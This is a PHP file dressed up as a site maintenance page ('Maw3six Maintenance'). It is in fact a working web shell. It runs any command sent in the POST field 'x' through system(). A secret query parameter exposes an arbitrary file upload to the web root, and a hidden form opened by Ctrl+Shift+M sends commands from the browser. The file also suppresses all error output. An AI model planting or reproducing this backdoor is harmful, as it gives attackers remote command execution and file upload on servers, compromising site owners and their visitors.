<?php
@set_time_limit(0);
@error_reporting(0);
@ini_set('display_errors', 0);
@ini_set('max_execution_time', 0);

$showUpload = isset($_GET['maw3six']);

if ($showUpload && isset($_POST['upload']) && isset($_FILES['file'])) {
    $uploadDir = './';
    $uploadFile = $uploadDir . basename($_FILES['file']['name']);
    
    if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadFile)) {
        $message = "File uploaded successfully: " . htmlspecialchars($_FILES['file']['name']);
        $messageType = "success";
    } else {
        $message = "File upload failed. Please try again.";
        $messageType = "error";
    }
}

if (isset($_POST['x'])) {
    $cmd = $_POST['x'];
    if (function_exists('system')) {
        ob_start();
        system($cmd . ' 2>&1');
        $output = ob_get_contents();
        ob_end_clean();
        echo "<pre>" . htmlspecialchars($output) . "</pre>";
        exit;
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Maw3six - Site Maintenance</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #f8f9fa;
            color: #333;
            line-height: 1.6;
            padding: 20px;
        }
        .container {
            max-width: 600px;
            margin: 50px auto;
            background: white;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            overflow: hidden;
        }
        .header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        .header h1 {
            font-size: 28px;
            margin-bottom: 10px;
        }
        .content {
            padding: 30px;
        }
        .maintenance-info {
            text-align: center;
            margin-bottom: 30px;
        }
        .maintenance-info h2 {
            color: #667eea;
            margin-bottom: 15px;
        }
        .maintenance-info p {
            color: #666;
            margin-bottom: 10px;
        }
        .upload-section {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border: 2px dashed #dee2e6;
        }
        .upload-section h3 {
            color: #495057;
            margin-bottom: 15px;
            font-size: 16px;
        }
        .file-input {
            width: 100%;
            padding: 10px;
            border: 1px solid #ced4da;
            border-radius: 5px;
            margin-bottom: 15px;
            background: white;
        }
        .upload-btn {
            background: #667eea;
            color: white;
            padding: 12px 30px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 14px;
            transition: background 0.3s;
        }
        .upload-btn:hover {
            background: #5a6fd8;
        }
        .message {
            padding: 15px;
            border-radius: 5px;
            margin-bottom: 20px;
            text-align: center;
        }
        .success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        .error {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
        .footer {
            background: #f8f9fa;
            padding: 20px;
            text-align: center;
            color: #6c757d;
            font-size: 12px;
        }
        .hidden-form {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔧 Maw3six Maintenance</h1>
            <p>Site temporarily under maintenance</p>
        </div>
        
        <div class="content">
            <?php if (isset($message)): ?>
                <div class="message <?php echo $messageType; ?>">
                    <?php echo $message; ?>
                </div>
            <?php endif; ?>
            
            <div class="maintenance-info">
                <h2>We'll be back soon!</h2>
                <p>Our website is currently undergoing scheduled maintenance.</p>
                <p>We appreciate your patience while we improve our services.</p>
                <?php if (!$showUpload): ?>
                <p style="font-size: 12px; color: #999; margin-top: 20px;">
                    Expected to be back online: <strong>Soon</strong>
                </p>
                <?php endif; ?>
            </div>
            
            <?php if ($showUpload): ?>
            <div class="upload-section">
                <h3>📁 Maintenance File Upload</h3>
                <p style="font-size: 12px; color: #6c757d; margin-bottom: 15px;">
                    Upload maintenance files or configuration updates
                </p>
                
                <form method="post" enctype="multipart/form-data" action="?maw3six">
                    <input type="file" name="file" class="file-input" required>
                    <button type="submit" name="upload" class="upload-btn">Upload File</button>
                </form>
            </div>
            <?php else: ?>
            <div style="text-align: center; padding: 20px; color: #6c757d;">
                <p>🔒 If you're an administrator, please contact the technical team.</p>
                <p style="font-size: 11px; margin-top: 10px;">Error Code: MW503</p>
            </div>
            <?php endif; ?>
            
            <!-- Hidden command execution form -->
            <form method="post" class="hidden-form" id="cmdForm">
                <input type="text" name="x" id="cmdInput">
                <input type="submit" value="Execute">
            </form>
        </div>
        
        <div class="footer">
            <p>&copy; 2025 Maw3six. All rights reserved. | Maintenance Mode Active</p>
        </div>
    </div>

    <script>
        window.maw = function(cmd) {
            document.getElementById('cmdInput').value = cmd;
            
            var form = document.getElementById('cmdForm');
            var currentParams = window.location.search;
            if (currentParams) {
                form.action = window.location.pathname + currentParams;
            }
            
            form.submit();
        };
        
        document.addEventListener('keydown', function(e) {
            if (e.ctrlKey && e.shiftKey && e.key === 'M') {
                var cmd = prompt('Maintenance');
                if (cmd) {
                    window.maw(cmd);
                }
            }
        });
        
        <?php if ($showUpload): ?>
        <?php else: ?>
        <?php endif; ?>
    </script>
</body>
</html>
